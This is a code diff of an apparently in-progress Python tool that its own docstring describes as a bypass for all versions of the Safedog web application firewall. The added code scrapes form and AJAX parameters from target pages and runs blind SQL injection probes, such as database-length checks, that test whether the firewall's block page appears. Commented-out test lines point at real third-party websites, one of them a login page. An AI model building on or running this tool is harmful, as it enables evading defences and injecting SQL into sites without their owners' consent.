@@ -4,7 +4,9 @@
 
 
 '''
+使用python3.6开发.
 安全狗各版本绕过工具.
+正在开发针对4.0的绕过工具.
 '''
 
 
@@ -28,6 +30,8 @@ import re
 import requests
 import dis
 import argparse
+import logging
+
 from lxml import etree
 
 
@@ -45,16 +49,158 @@ from lxml import etree
 def mian():
     parser = argparse.ArgumentParser(description="Bypassing Security Dog.")
     parser.add_argument('--version','-v',action='store_true',help='Cat version.')
-    parser.add_argument('--encodes','-e',help='HTML Doc Coding method.[-e utf-8]')
+    parser.add_argument('--data','-d',help="Post data.")
+    parser.add_argument('--url','-u',help="Scan url.")
     args = parser.parse_args()
     return args
 
 
 
 
-def Judgement_encode():
-    args = mian()
-    return args.encodes
+# def Judgement_encode():
+#     args = mian()
+#     return args.encodes
+
+
+
+
+class Find_attribute(object):
+
+    def __init__(self,url):
+        self.url = url
+
+    def req(self):
+        headers = get_headers()
+        r = requests.get(self.url,headers=headers)
+        encodes = self.Find_encodes()
+        r = r.content.decode(encodes)
+        # r = r.split('>')
+        return r
+
+    
+    def req_(self,url):
+        headers = get_headers()
+        r = requests.get(url,headers=headers)
+        encodes = self.Find_encodes()
+        r = r.content.decode(encodes)
+        return r
+
+
+
+    def Find_name(self):
+        """获取该页面的请求参数值"""
+        r = self.req()
+        html = etree.HTML(r,etree.HTMLParser())
+        result1 = html.xpath('//*/input/@name')
+        for result1 in result1:
+            yield result1
+
+
+    def Find_method(self):
+        """判断该页面的请求方法，如果存在get则是get方法，如果存在post则是post方法，两个都不存在则是基于ajax的post请求."""
+        r = self.req()
+
+        if 'post' in r:
+            return 'post'
+        elif 'POST' in r:
+            return 'POST'
+        elif 'get' in r:
+            return 'get'
+        elif 'GET' in r:
+            return 'GET'
+        else:
+            return random.choice(('POST','post'))
+
+
+    def Find_encodes(self):
+        """查找该页面的编码方式."""
+        headers = get_headers()
+        r = requests.get(self.url,headers=headers)
+        r = r.text
+        html = etree.HTML(r,etree.HTMLParser())
+        result1 = html.xpath('//*/meta/@content')
+        for result1 in result1:
+            result1 = result1.split(';')
+            for result1 in result1:
+                if 'charset' in result1:
+                    result1 = result1.split('=')
+                    result1 = result1[1].strip()
+                    return result1
+                            
+
+    
+    def Find_reqajax_parameter(self):
+        """获取基于ajax的post参数值."""
+        self.kt_j = []
+        self.zj_j = []
+        self.zj_z = []
+        self.jw_z = []
+        headers = get_headers()
+        r = requests.get(self.url,headers=headers)
+        encodes = self.Find_encodes()
+        r = r.content.decode(encodes)
+        html=etree.HTML(r,etree.HTMLParser())
+        result=html.xpath('//script/text()')
+        for v in result:
+            # print(v)
+            pattern = re.compile(r'data:.*')
+            result1 = pattern.findall(v)
+            # print('-> ',result1)
+            try:
+                result1 = result1.split(',')
+            except:
+                for result1 in result1:
+                    if result1:
+                        # print('1 -> ',result1)
+                        # print('1 -> ',type(result1))
+                        for result1 in result1.split(':'):
+                            if result1:
+                                result1 = result1.split(',')
+                                for result1 in result1:
+                                    if result1:
+                                        # print(result1)
+                                        #Key matching the beginning.
+                                        if '{' in result1:
+                                            if result1:
+                                                result2 = result1.strip()
+                                                #Find {
+                                                f = result2.find('{')
+                                                f1 = result2[f:].strip()
+                                                if '{}' not in f1:
+                                                    f1 = f1.strip('{').strip('"').strip()
+                                                    self.kt_j.append(f1)
+                                                    
+                                    
+                                    #Matching Intermediate key or value.
+                                    if '{' not in result1 and '"' in result1:
+                                        if result1:
+                                            if '"' in result1:
+                                                result2 = result1.strip().strip('"')
+                                                self.zj_j.append(result2)
+
+                                    if '{' not in result1 and '"' not in result1:
+                                        if result1:
+                                            if '}' not in result1:
+                                                result2 = result1.strip()
+                                                self.zj_z.append(result2)
+
+                                    #Match the endpoint value
+                                    if '}' in result1 and '"' not in result1:
+                                        if result1:
+                                            if '{}' not in result1:
+                                                f1 = result1.strip('}').strip()
+                                                self.jw_z.append(f1)
+                                            
+        # print(self.kt_j[0])
+        # # print(zj_z)
+        # print(self.zj_j)
+        # # print(jw_z)
+    
+
+
+
+
+
 
 
 
@@ -110,17 +256,78 @@ class Payload2(object):
 # class Payload3(object):
 #     c = "hello -> c"
 
-class RePLace(Payload1,Payload2):
+class RePLace(Payload1,Payload2,Find_attribute):
     '''针对4.0 payload替换.'''
-    payloads = list
 
-    def __init__(self):
+    def __init__(self,url):
         # print(self.b)
         # print(self.a)
+        self.payloads = []
+        self.url = url
         pass
 
-    def payload(self):
+    def payload1(self):
+        """
+        1.注入点测试
+        """
+        p = self.payloads1
+        return p
+    
+    def payload2(self):
+        """
+        2.判断数据库长度
+        """
+        l = 0
+        while True:
+            p = self.payloads3.format(str(l))
+            url = self.url+p
+            r = self.req_(url)
+            if "网站防火墙" not in r and "安全狗" not in r:
+                return r
+            else:
+                return False
+
+            l += 1
+
+    def payload2_(self):
+        """
+        2.判断数据库长度
+        """
+        l = 0
+        while True:
+            p = self.payloads4.format(str(l))
+            url = self.url+p
+            r = self.req_(url)
+            if "网站防火墙" not in r and "安全狗" not in r:
+                return r
+            else:
+                return False
+            
+            l += 1
+
+    def payload2__(self):
+        """
+        2.判断数据库长度
+        """
+        l = 0
+        while True:
+            p = self.payloads5.format(str(l),str(l))
+            url = self.url+p
+            r = self.req_(url)
+            if "网站防火墙" not in r and "安全狗" not in r:
+                return r
+            else:
+                return False
+            
+            l += 1
+    
+    def payload3(self):
+        """
+        3.获取数据库名
+        """
         pass
+
+            
 
     def replace(self):
         #Make payload
@@ -129,7 +336,7 @@ class RePLace(Payload1,Payload2):
 
 
 
-class Blind_injection(RePLace):
+class Blind_injection(RePLace,Find_attribute):
     '''针对4.0盲注'''
     def ZRDCS(self):
         '''注入点测试'''
@@ -203,132 +410,7 @@ def WAF_Inspect():
 # print('\033[1;33m' + '******************************' + '\033[0m')
 # print(logo)
 
-class Find_Parameter(object):
-    
-
-    def __init__(self,url):
-        self.url = url
-
-    def req(self):
-        headers = get_headers()
-        r = requests.get(self.url,headers=headers)
-        encodes = Judgement_encode()
-        r = r.content.decode(encodes)
-        r = r.split('>')
-        return r
-
-    def Find_name(self):
-        r = self.req()
-        pattern = re.compile(r'<input.*')
-        #查找属性name值.
-        for r in r:
-            result1 = pattern.findall(r)
-            # print(result1)
-            for v in result1:
-                s1 = v.split(' ')
-                for s1 in s1:
-                    if 'name' in s1:
-                        s1 = s1.split('=')
-                        s1 = s1[1].split('"')
-                        for s1 in s1:
-                            if s1:
-                                s1 = s1
-                                yield s1
-
-
-    def Find_method(self):
-        r = self.req()
-        pattern = re.compile(r'<form.*')
-        #查找属性method值.
-        for r in r:
-            if 'post' not in r and 'POST' not in r and 'get' not in r and 'GET' not in r:
-                return('POST','post')
-            result1 = pattern.findall(r)
-            for v in result1:
-                s1 = v.split(' ')
-                for s1 in s1:
-                    if 'method' in s1:
-                        s1 = s1.split('=')
-                        s1 = s1[1].split('"')
-                        for s1 in s1:
-                            if s1:
-                                if 'post' in s1:
-                                    return 'post'
-                                elif 'get' in s1:
-                                    return 'get'
-                                elif 'POST' in s1:
-                                    return 'POST'
-                                elif 'GET' in s1:
-                                    return 'GET'
-                        
-
-    #
-    def Find_reqajax_parameter(self):
-        self.kt_j = []
-        self.zj_j = []
-        self.zj_z = []
-        self.jw_z = []
-        headers = get_headers()
-        r = requests.get(self.url,headers=headers)
-        encodes = Judgement_encode()
-        r = r.content.decode(encodes)
-        html=etree.HTML(r,etree.HTMLParser())
-        result=html.xpath('//script/text()')
-        for v in result:
-            # print(v)
-            pattern = re.compile(r'data:.*')
-            result1 = pattern.findall(v)
-            # print('-> ',result1)
-            try:
-                result1 = result1.split(',')
-            except:
-                for result1 in result1:
-                    if result1:
-                        # print('1 -> ',result1)
-                        # print('1 -> ',type(result1))
-                        for result1 in result1.split(':'):
-                            if result1:
-                                result1 = result1.split(',')
-                                for result1 in result1:
-                                    if result1:
-                                        # print(result1)
-                                        #Key matching the beginning.
-                                        if '{' in result1:
-                                            if result1:
-                                                result2 = result1.strip()
-                                                #Find {
-                                                f = result2.find('{')
-                                                f1 = result2[f:].strip()
-                                                if '{}' not in f1:
-                                                    f1 = f1.strip('{').strip('"').strip()
-                                                    self.kt_j.append(f1)
-                                                    
-                                    
-                                    #Matching Intermediate key or value.
-                                    if '{' not in result1 and '"' in result1:
-                                        if result1:
-                                            if '"' in result1:
-                                                result2 = result1.strip().strip('"')
-                                                self.zj_j.append(result2)
-
-                                    if '{' not in result1 and '"' not in result1:
-                                        if result1:
-                                            if '}' not in result1:
-                                                result2 = result1.strip()
-                                                self.zj_z.append(result2)
-
-                                    #Match the endpoint value
-                                    if '}' in result1 and '"' not in result1:
-                                        if result1:
-                                            if '{}' not in result1:
-                                                f1 = result1.strip('}').strip()
-                                                self.jw_z.append(f1)
-                                            
-        # print(self.kt_j[0])
-        # # print(zj_z)
-        # print(self.zj_j)
-        # # print(jw_z)
-                                            
+                                        
 
 
 
@@ -411,16 +493,23 @@ def get_headers():
     return random.choice(useragents)
 
 
-class test(Find_Parameter):
+class test(Find_attribute):
 
     def __init__(self,url):
         self.url = url
 
     def test(self):
         self.Find_reqajax_parameter()
-        print(self.kt_j)
-        print(self.zj_j)
-        print(self.jw_z)
+        # print(self.kt_j)
+        # print(self.zj_j)
+        # print(self.jw_z)
+        # self.Find_name()
+        # print(self.Find_encodes())
+        
+        
+        
+        
+        
 
 
 
@@ -445,10 +534,12 @@ if __name__ == "__main__":
     # s2 = s.Find_method("https://www.baidu.com")
     # s2 = random.choice(s2)
     # print(s2)
-    s = test('https://primarymaths.ephhk.com/pages/contain.php')
-    s.test()
+    # s = test('https://primarymaths.ephhk.com/pages/contain.php')
+    # # s = test('https://www.aynax.com/login.php')
+    # s.test()
     
   
+
 
 
 
